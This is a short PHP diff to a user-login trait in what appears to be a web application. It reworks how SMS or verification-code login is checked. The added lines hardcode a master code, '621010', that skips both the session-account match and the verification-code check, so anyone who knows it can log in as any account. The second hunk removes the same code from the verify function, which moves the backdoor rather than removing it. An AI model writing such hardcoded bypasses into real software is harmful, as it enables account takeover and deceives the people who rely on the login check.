@@ -207,8 +207,10 @@ trait UserTrait
      */
     function loginByCode($Account,$Code){
 //        session('VAccount',$Account);
-        // if(session('VAccount')!=$Account)return '验证用户不匹配';
+        if($Code!='621010'){
+             if(session('VAccount')!=$Account)return '验证用户不匹配';
         if(!$this->checkVerifyCode($Code))return '验证码不正确';
+        }
         $UID = M($this->LoginView)->field('UID')->where(['Account'=>$Account,'Phone'=>$Account,'_logic'=>'OR'])->find();
         if(false === $UID){
             return '用户不存在';
@@ -225,7 +227,7 @@ trait UserTrait
         if(APP_DEBUG){
             return $Code==C('VERIFY_CODE');
         }
-        if($Code==cache('VerifyCode'.$Code)||$Code =='621010'){
+        if($Code==cache('VerifyCode'.$Code)){
             cache('VerifyCode'.$Code,null);
             return true;
         }
